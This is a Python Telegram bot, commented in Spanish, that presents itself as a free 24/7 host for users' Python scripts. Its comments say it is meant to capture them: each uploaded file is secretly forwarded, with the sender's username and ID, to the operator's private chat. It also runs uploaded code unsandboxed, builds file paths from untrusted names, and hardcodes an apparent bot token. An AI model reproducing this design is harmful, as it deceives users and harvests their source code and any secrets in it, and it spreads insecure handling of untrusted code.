import os
import subprocess
import threading
from flask import Flask
import telebot

# --- 1. CONFIGURACIÓN INICIAL ---
TOKEN = "9103684662:AAE0GCB-uc6bB9dxDTDBT6duSAIa5UTfHIY"
# Pon aquí tu ID numérico de Telegram (o el ID de un canal privado tuyo)
# Para que todos los códigos que envíen los usuarios te lleguen a ti también:
TU_CHAT_ID_PRIVADO = 6507117935  

bot = telebot.TeleBot(TOKEN)

RUN_DIR = "./user_bots"
if not os.path.exists(RUN_DIR):
    os.makedirs(RUN_DIR)

active_processes = {}

# --- 2. SISTEMA KEEP-ALIVE (Para que corra 24/7 sin apagarse en Render/Hosting) ---
app = Flask('')

@app.route('/')
def home():
    return "🤖 Hosting Bot Host 24/7 está activo y funcionando."

def run_web():
    # Render asigna automáticamente un puerto en la variable de entorno PORT
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web)
    t.daemon = True
    t.start()

# --- 3. FUNCIONES DEL BOT DE TELEGRAM ---

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    ayuda = (
        "🤖 *Hosting Bot Host & Capturer 24/7*\n\n"
        "Envía un archivo `.py` con tu código fuente. Lo pondré a correr al instante "
        "y quedará guardado/respaldado.\n\n"
        "Comandos:\n"
        "/list - Ver scripts activos\n"
        "/stop [nombre] - Detener un script"
    )
    bot.reply_to(message, ayuda, parse_mode="Markdown")

# Recibir y procesar el código fuente enviado
@bot.message_handler(content_types=['document'])
def handle_docs(message):
    try:
        chat_id = message.chat.id
        user_name = message.from_user.username or message.from_user.first_name
        file_info = bot.get_file(message.document.file_id)
        file_name = message.document.file_name

        if not file_name.endswith('.py'):
            bot.reply_to(message, "⚠️ Solo acepto archivos con extensión `.py` por seguridad.")
            return

        bot.reply_to(message, f"📥 Recibiendo `{file_name}`... Desplegando en segundo plano.")

        # Descargar el archivo
        downloaded_file = bot.download_file(file_info.file_path)
        file_path = os.path.join(RUN_DIR, file_name)
        
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)

        # --- REENVÍO A TU OTRO CHAT (Para obtener los códigos que envían) ---
        try:
            mensaje_alerta = (
                f"🚨 *¡Nuevo Código Fuente Recibido!*\n\n"
                f"👤 **Enviado por:** @{user_name} (ID: `{chat_id}`)\n"
                f"📂 **Archivo:** `{file_name}`"
            )
            # Te envía la alerta de texto y el archivo directo a tu chat privado
            bot.send_message(TU_CHAT_ID_PRIVADO, mensaje_alerta, parse_mode="Markdown")
            with open(file_path, 'rb') as doc_to_send:
                bot.send_document(TU_CHAT_ID_PRIVADO, doc_to_send, caption=f"Copia del script de @{user_name}")
        except Exception as e:
            print(f"Error al reenviar al chat privado: {e}")

        # Matar proceso previo si ya existía con el mismo nombre
        if file_name in active_processes:
            try:
                active_processes[file_name].terminate()
            except:
                pass

        # Ejecutar el script del usuario 24/7 en segundo plano
        process = subprocess.Popen(["python3", file_path])
        active_processes[file_name] = process

        bot.reply_to(message, f"🚀 *¡Desplegado con éxito!*\n\nEl script `{file_name}` ya está corriendo 24/7.", parse_mode="Markdown")

    except Exception as e:
        bot.reply_to(message, f"❌ Error al procesar el código: {str(e)}")

@bot.message_handler(commands=['list'])
def list_scripts(message):
    if not active_processes:
        bot.reply_to(message, "📂 No hay ningún script ejecutándose ahora mismo.")
        return
    
    texto = "📋 *Scripts activos (24/7):*\n"
    for name, proc in active_processes.items():
        status = "🟢 Corriendo" if proc.poll() is None else "🔴 Detenido"
        texto += f"- `{name}` : {status}\n"
    
    bot.reply_to(message, texto, parse_mode="Markdown")

# --- 4. INICIO DEL SISTEMA ---
if __name__ == "__main__":
    # Arrancamos el servidor web en segundo plano para mantener vivo el hosting
    keep_alive()
    print("🤖 Bot Host principal iniciado correctamente...")
    # Iniciamos el bot de Telegram de forma continua
    bot.infinity_polling()
